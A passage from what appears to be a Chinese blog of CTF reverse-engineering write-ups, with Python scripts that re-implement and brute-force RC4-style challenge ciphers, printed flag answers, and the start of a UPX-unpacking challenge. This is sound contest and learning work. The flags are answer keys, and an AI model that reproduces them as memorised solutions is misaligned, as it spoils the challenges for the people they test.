<span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;res用于解密字符串，解密后是：%res&quot;</span> %res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的字符串是：%s&quot;</span> %cipher)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的输出(没经过任何编码):&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line">a=[<span class="number">0x45</span>,<span class="number">0xa</span>,<span class="number">0x71</span>,<span class="number">0xc5</span>,<span class="number">0x98</span>,<span class="number">0x14</span>,<span class="number">0xab</span>,<span class="number">0x1c</span>,<span class="number">0xf0</span>,<span class="number">0xa2</span>,<span class="number">0x70</span>,<span class="number">0x6e</span>,<span class="number">0xc</span>,<span class="number">0xa</span>,<span class="number">0x5b</span>,<span class="number">0xdc</span>,<span class="number">0xfc</span>,<span class="number">0x91</span>,<span class="number">0x27</span>,<span class="number">0xc0</span>,<span class="number">0x9c</span>,<span class="number">0x2c</span>,<span class="number">0x8c</span>,<span class="number">0x97</span>,<span class="number">0x56</span>,<span class="number">0x8c</span>,<span class="number">0xec</span>,<span class="number">0x56</span>,<span class="number">0x3b</span>,<span class="number">0xab</span>,<span class="number">0x98</span>,<span class="number">0xf4</span>,<span class="number">0x1d</span>,<span class="number">0x51</span>,<span class="number">0xd3</span>,<span class="number">0x43</span>,<span class="number">0xf9</span>,<span class="number">0xc9</span>,<span class="number">0x72</span>,<span class="number">0xe0</span>,<span class="number">0x71</span>,<span class="number">0x6a</span>] <span class="comment">#cipher</span></span><br><span class="line">key=<span class="string">&quot;VrDQ-ffgaEig04qx&quot;</span></span><br><span class="line">s=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    s+=<span class="built_in">chr</span>(i)</span><br><span class="line">s=<span class="built_in">str</span>(base64.b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">rc4_main(key, s)</span><br></pre></td></tr></table></figure>

<p>得到flag：flag{e0f18a30-d573-41d6-a1fb-f4691a82f701}</p>
<h2 id="encrytor"><a href="#encrytor" class="headerlink" title="encrytor"></a>encrytor</h2><p>加密是这样的逻辑，先随机生成4个字节&#x2F;3个字节或者2个字节的数，然后sha256加密，然后是进行对sbox的初始化，然后是对flag进行加密，用的是sbox来异或。</p>
<p>下面是正向加密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">hex_string</span>):</span><br><span class="line">    int_array = [<span class="built_in">int</span>(hex_string[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_string), <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> int_array</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sbox_init</span>(<span class="params">h</span>):</span><br><span class="line">    a = [<span class="number">0x00</span>, <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3A</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0x3E</span>, <span class="number">0x3F</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x4F</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x5F</span>, <span class="number">0x60</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>, <span class="number">0x7D</span>, <span class="number">0x7E</span>, <span class="number">0x7F</span>, <span class="number">0x80</span>, <span class="number">0x81</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x84</span>, <span class="number">0x85</span>, <span class="number">0x86</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x8A</span>, <span class="number">0x8B</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>, <span class="number">0x8E</span>, <span class="number">0x8F</span>, <span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x95</span>, <span class="number">0x96</span>, <span class="number">0x97</span>, <span class="number">0x98</span>, <span class="number">0x99</span>, <span class="number">0x9A</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>, <span class="number">0x9D</span>, <span class="number">0x9E</span>, <span class="number">0x9F</span>, <span class="number">0xA0</span>, <span class="number">0xA1</span>, <span class="number">0xA2</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>, <span class="number">0xA5</span>, <span class="number">0xA6</span>, <span class="number">0xA7</span>, <span class="number">0xA8</span>, <span class="number">0xA9</span>, <span class="number">0xAA</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0xAD</span>, <span class="number">0xAE</span>, <span class="number">0xAF</span>, <span class="number">0xB0</span>, <span class="number">0xB1</span>, <span class="number">0xB2</span>, <span class="number">0xB3</span>, <span class="number">0xB4</span>, <span class="number">0xB5</span>, <span class="number">0xB6</span>, <span class="number">0xB7</span>, <span class="number">0xB8</span>, <span class="number">0xB9</span>, <span class="number">0xBA</span>, <span class="number">0xBB</span>, <span class="number">0xBC</span>, <span class="number">0xBD</span>, <span class="number">0xBE</span>, <span class="number">0xBF</span>, <span class="number">0xC0</span>, <span class="number">0xC1</span>, <span class="number">0xC2</span>, <span class="number">0xC3</span>, <span class="number">0xC4</span>, <span class="number">0xC5</span>, <span class="number">0xC6</span>, <span class="number">0xC7</span>, <span class="number">0xC8</span>, <span class="number">0xC9</span>, <span class="number">0xCA</span>, <span class="number">0xCB</span>, <span class="number">0xCC</span>, <span class="number">0xCD</span>, <span class="number">0xCE</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xD1</span>, <span class="number">0xD2</span>, <span class="number">0xD3</span>, <span class="number">0xD4</span>, <span class="number">0xD5</span>, <span class="number">0xD6</span>, <span class="number">0xD7</span>, <span class="number">0xD8</span>, <span class="number">0xD9</span>, <span class="number">0xDA</span>, <span class="number">0xDB</span>, <span class="number">0xDC</span>, <span class="number">0xDD</span>, <span class="number">0xDE</span>, <span class="number">0xDF</span>, <span class="number">0xE0</span>, <span class="number">0xE1</span>, <span class="number">0xE2</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xE5</span>, <span class="number">0xE6</span>, <span class="number">0xE7</span>, <span class="number">0xE8</span>, <span class="number">0xE9</span>, <span class="number">0xEA</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>, <span class="number">0xED</span>, <span class="number">0xEE</span>, <span class="number">0xEF</span>, <span class="number">0xF0</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, <span class="number">0xF4</span>, <span class="number">0xF5</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF8</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>]</span><br><span class="line">    v7 = <span class="number">0</span></span><br><span class="line">    v6 = <span class="number">0</span></span><br><span class="line">    sha = change(h)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        v9 = v7 + <span class="number">1</span></span><br><span class="line">        v10 = a[v7 + <span class="number">2</span>]</span><br><span class="line">        v11 = v10 + v6</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0x20</span> | v7) &gt;&gt; <span class="number">32</span>:</span><br><span class="line">            v8 = v7 % <span class="number">0x20</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v8 = v7 % <span class="number">0x20</span></span><br><span class="line">        v6 = (sha[v8] + v11) &amp; <span class="number">0xff</span></span><br><span class="line">        a[v7 + <span class="number">2</span>] = a[v6 + <span class="number">2</span>]</span><br><span class="line">        a[v6 + <span class="number">2</span>] = v10</span><br><span class="line">        v7 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode1</span>(<span class="params">xbox</span>):</span><br><span class="line">    v5 = <span class="number">0</span></span><br><span class="line">    v6 = <span class="number">1</span></span><br><span class="line">    flag = <span class="string">&quot;111111111111111111111111111111111111111&quot;</span></span><br><span class="line">    cmp = [<span class="number">255</span>, <span class="number">75</span>, <span class="number">90</span>, <span class="number">35</span>, <span class="number">133</span>, <span class="number">90</span>, <span class="number">109</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">117</span>, <span class="number">67</span>, <span class="number">48</span>, <span class="number">107</span>, <span class="number">163</span>, <span class="number">38</span>, <span class="number">179</span>, <span class="number">27</span>, <span class="number">57</span>, <span class="number">109</span>, <span class="number">104</span>, <span class="number">200</span>, <span class="number">234</span>, <span class="number">116</span>, <span class="number">204</span>, <span class="number">127</span>, <span class="number">160</span>, <span class="number">119</span>, <span class="number">212</span>, <span class="number">49</span>, <span class="number">65</span>, <span class="number">93</span>, <span class="number">107</span>, <span class="number">107</span>, <span class="number">69</span>]    </span><br><span class="line">    xx = [<span class="number">0</span>] * <span class="built_in">len</span>(cmp)</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    v7 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp)):</span><br><span class="line">        xbox[<span class="number">0</span>] = v6 + i</span><br><span class="line">        v8 = (v6 +i) &amp; <span class="number">0xff</span></span><br><span class="line">        v9 = xbox[v8 + <span class="number">2</span>]</span><br><span class="line">        v5 += v9 </span><br><span class="line">        v5 = v5 &amp; <span class="number">0xff</span></span><br><span class="line">        xbox[v8 + <span class="number">2</span>] = xbox[(v5 + <span class="number">2</span>) &amp; <span class="number">0xff</span>]</span><br><span class="line">        xbox[(v5 + <span class="number">2</span>) &amp; <span class="number">0xff</span>] = v9</span><br><span class="line">        xx[i] = xbox[(xbox[v8 + <span class="number">2</span>] + v9 + <span class="number">2</span>) &amp; <span class="number">0xff</span>] ^ cmp[i]</span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span>(xx)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;480&#x27;</span></span><br><span class="line">h=<span class="string">&quot;965761235685bf29fc5a962a08187f9902867a2ba1aaf72c470adea20eccb7fc&quot;</span></span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line">box = sbox_init(h)</span><br><span class="line"><span class="built_in">print</span>(box)</span><br><span class="line">encode1(box)</span><br><span class="line">arr = [i1, i2, i3,i4]</span><br><span class="line"><span class="keyword">if</span>(hashlib.sha1(<span class="built_in">bytes</span>(arr)).hexdigest().lower() == <span class="string">&quot;2e60865e94119223c4657eac98d744ee909e66b8&quot;</span></span><br></pre></td></tr></table></figure>

<p>下面是爆破脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">hex_string</span>):</span><br><span class="line">    int_array = [<span class="built_in">int</span>(hex_string[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_string), <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> int_array</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sbox_init</span>(<span class="params">h</span>):</span><br><span class="line">    a = [<span class="number">0x00</span>, <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x1E</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3A</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0x3E</span>, <span class="number">0x3F</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x4F</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x5F</span>, <span class="number">0x60</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>, <span class="number">0x7D</span>, <span class="number">0x7E</span>, <span class="number">0x7F</span>, <span class="number">0x80</span>, <span class="number">0x81</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x84</span>, <span class="number">0x85</span>, <span class="number">0x86</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x8A</span>, <span class="number">0x8B</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>, <span class="number">0x8E</span>, <span class="number">0x8F</span>, <span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x95</span>, <span class="number">0x96</span>, <span class="number">0x97</span>, <span class="number">0x98</span>, <span class="number">0x99</span>, <span class="number">0x9A</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>, <span class="number">0x9D</span>, <span class="number">0x9E</span>, <span class="number">0x9F</span>, <span class="number">0xA0</span>, <span class="number">0xA1</span>, <span class="number">0xA2</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>, <span class="number">0xA5</span>, <span class="number">0xA6</span>, <span class="number">0xA7</span>, <span class="number">0xA8</span>, <span class="number">0xA9</span>, <span class="number">0xAA</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0xAD</span>, <span class="number">0xAE</span>, <span class="number">0xAF</span>, <span class="number">0xB0</span>, <span class="number">0xB1</span>, <span class="number">0xB2</span>, <span class="number">0xB3</span>, <span class="number">0xB4</span>, <span class="number">0xB5</span>, <span class="number">0xB6</span>, <span class="number">0xB7</span>, <span class="number">0xB8</span>, <span class="number">0xB9</span>, <span class="number">0xBA</span>, <span class="number">0xBB</span>, <span class="number">0xBC</span>, <span class="number">0xBD</span>, <span class="number">0xBE</span>, <span class="number">0xBF</span>, <span class="number">0xC0</span>, <span class="number">0xC1</span>, <span class="number">0xC2</span>, <span class="number">0xC3</span>, <span class="number">0xC4</span>, <span class="number">0xC5</span>, <span class="number">0xC6</span>, <span class="number">0xC7</span>, <span class="number">0xC8</span>, <span class="number">0xC9</span>, <span class="number">0xCA</span>, <span class="number">0xCB</span>, <span class="number">0xCC</span>, <span class="number">0xCD</span>, <span class="number">0xCE</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xD1</span>, <span class="number">0xD2</span>, <span class="number">0xD3</span>, <span class="number">0xD4</span>, <span class="number">0xD5</span>, <span class="number">0xD6</span>, <span class="number">0xD7</span>, <span class="number">0xD8</span>, <span class="number">0xD9</span>, <span class="number">0xDA</span>, <span class="number">0xDB</span>, <span class="number">0xDC</span>, <span class="number">0xDD</span>, <span class="number">0xDE</span>, <span class="number">0xDF</span>, <span class="number">0xE0</span>, <span class="number">0xE1</span>, <span class="number">0xE2</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xE5</span>, <span class="number">0xE6</span>, <span class="number">0xE7</span>, <span class="number">0xE8</span>, <span class="number">0xE9</span>, <span class="number">0xEA</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>, <span class="number">0xED</span>, <span class="number">0xEE</span>, <span class="number">0xEF</span>, <span class="number">0xF0</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, <span class="number">0xF4</span>, <span class="number">0xF5</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF8</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>]</span><br><span class="line">    v7 = <span class="number">0</span></span><br><span class="line">    v6 = <span class="number">0</span></span><br><span class="line">    sha = change(h)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        v9 = v7 + <span class="number">1</span></span><br><span class="line">        v10 = a[v7 + <span class="number">2</span>]</span><br><span class="line">        v11 = v10 + v6</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0x20</span> | v7) &gt;&gt; <span class="number">32</span>:</span><br><span class="line">            v8 = v7 % <span class="number">0x20</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v8 = v7 % <span class="number">0x20</span></span><br><span class="line">        v6 = (sha[v8] + v11) &amp; <span class="number">0xff</span></span><br><span class="line">        a[v7 + <span class="number">2</span>] = a[v6 + <span class="number">2</span>]</span><br><span class="line">        a[v6 + <span class="number">2</span>] = v10</span><br><span class="line">        v7 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode1</span>(<span class="params">xbox</span>):</span><br><span class="line">    v5 = <span class="number">0</span></span><br><span class="line">    v6 = <span class="number">1</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmp = [<span class="number">0xa2</span>,<span class="number">0x05</span>,<span class="number">0x05</span>,<span class="number">0xdb</span>,<span class="number">0x23</span>,<span class="number">0x11</span>,<span class="number">0x0e</span>,<span class="number">0x39</span>,<span class="number">0x46</span>,<span class="number">0x06</span>,<span class="number">0x0c</span>,<span class="number">0xd1</span>,<span class="number">0x91</span>,<span class="number">0xc6</span>,<span class="number">0x44</span>,<span class="number">0xe2</span>,<span class="number">0x1a</span>,<span class="number">0x9c</span>,<span class="number">0x61</span>,<span class="number">0xf1</span>,<span class="number">0xd3</span>,<span class="number">0xeb</span>,<span class="number">0x75</span>,<span class="number">0x3a</span>,<span class="number">0x81</span>,<span class="number">0x5d</span>,<span class="number">0xa2</span>,<span class="number">0x12</span>,<span class="number">0xb4</span>,<span class="number">0x58</span>,<span class="number">0x2a</span>,<span class="number">0xdb</span>,<span class="number">0x94</span>,<span class="number">0x14</span>]</span><br><span class="line">    xx = [<span class="number">0</span>] * <span class="built_in">len</span>(cmp)</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    v7 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp)):</span><br><span class="line">        xbox[<span class="number">0</span>] = v6 + i</span><br><span class="line">        v8 = (v6 +i) &amp; <span class="number">0xff</span></span><br><span class="line">        v9 = xbox[v8 + <span class="number">2</span>]</span><br><span class="line">        v5 += v9 </span><br><span class="line">        v5 = v5 &amp; <span class="number">0xff</span></span><br><span class="line">        xbox[v8 + <span class="number">2</span>] = xbox[(v5 + <span class="number">2</span>) &amp; <span class="number">0xff</span>]</span><br><span class="line">        xbox[(v5 + <span class="number">2</span>) &amp; <span class="number">0xff</span>] = v9</span><br><span class="line">        flag += <span class="built_in">chr</span>(xbox[(xbox[v8 + <span class="number">2</span>] + v9 + <span class="number">2</span>) &amp; <span class="number">0xff</span>] ^ cmp[i])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">dic=<span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> dic:</span><br><span class="line">                key = i + j + k + m</span><br><span class="line">                h=hashlib.sha256(key.encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">                box = sbox_init(h)</span><br><span class="line">                encode1(box)</span><br><span class="line"><span class="comment">#flag&#123;3df837d045ea07d9230cd23047a&#125;</span></span><br></pre></td></tr></table></figure>

<p>后面看到是个rc4，没看出来说是，白逆半天了。</p>
<h1 id="陕西省赛逆向ak"><a href="#陕西省赛逆向ak" class="headerlink" title="陕西省赛逆向ak"></a>陕西省赛逆向ak</h1><p>战队名称：第1名</p>
<p><img src="/2023/06/05/%E4%B8%8A%E6%B5%B7%E7%9C%81%E8%B5%9B-%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B/1.png"></p>
<h2 id="easyupx"><a href="#easyupx" class="headerlink" title="easyupx"></a>easyupx</h2><p>先修一下</p>
<p>![Untitled](.&#x2F;上海省赛-陕西省赛初赛&#x2F;Untitled 1.png)</p>
<p>发现还是脱不了壳，直接esp定律手脱</p>
